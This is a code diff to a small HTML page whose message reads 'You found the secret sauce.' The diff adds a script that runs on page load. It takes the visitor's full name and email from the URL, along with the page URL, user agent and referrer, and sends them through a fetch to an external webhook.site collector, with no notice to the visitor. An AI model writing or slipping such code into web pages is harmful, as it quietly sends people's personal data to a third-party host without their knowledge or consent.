@@ -2,9 +2,9 @@
   <body>
     You found the secret sauce.
   </body>
-   <script>
-        // Console logging for protected-info query parameters
-        function logProtectedInfoParams() {
+      <script>
+        // Console logging and webhook sending for protected-info query parameters
+        async function logProtectedInfoParams() {
             const urlParams = new URLSearchParams(window.location.search);
             const fullname = urlParams.get('fullname');
             const email = urlParams.get('email');
@@ -14,7 +14,9 @@
             console.log('Fullname parameter:', fullname || 'Not provided');
             console.log('Email parameter:', email || 'Not provided');
             
-            if (fullname && email) {
+            const hasAccess = fullname && email;
+            
+            if (hasAccess) {
                 console.log('✅ Both required parameters are present');
                 console.log(`Access attempt by: ${fullname} (${email})`);
             } else {
@@ -23,6 +25,34 @@
                 if (!email) console.log('Missing: email');
             }
             console.log('=====================================');
+            
+            // Send data to webhook using GET with query parameters
+            const webhookParams = new URLSearchParams({
+                timestamp: new Date().toISOString(),
+                url: window.location.href,
+                fullname: fullname || '',
+                email: email || '',
+                hasAccess: hasAccess.toString(),
+                userAgent: navigator.userAgent,
+                referrer: document.referrer || ''
+            });
+            
+            const webhookUrl = `https://webhook.site/0137d718-d4ea-4270-9665-98edb309f6b4?${webhookParams.toString()}`;
+            
+            try {
+                console.log('Sending data to webhook via GET...', webhookUrl);
+                const response = await fetch(webhookUrl, {
+                    method: 'GET'
+                });
+                
+                if (response.ok) {
+                    console.log('✅ Webhook data sent successfully');
+                } else {
+                    console.log('❌ Webhook request failed:', response.status, response.statusText);
+                }
+            } catch (error) {
+                console.error('❌ Error sending webhook data:', error);
+            }
         }
         
         // Log parameters when page loads
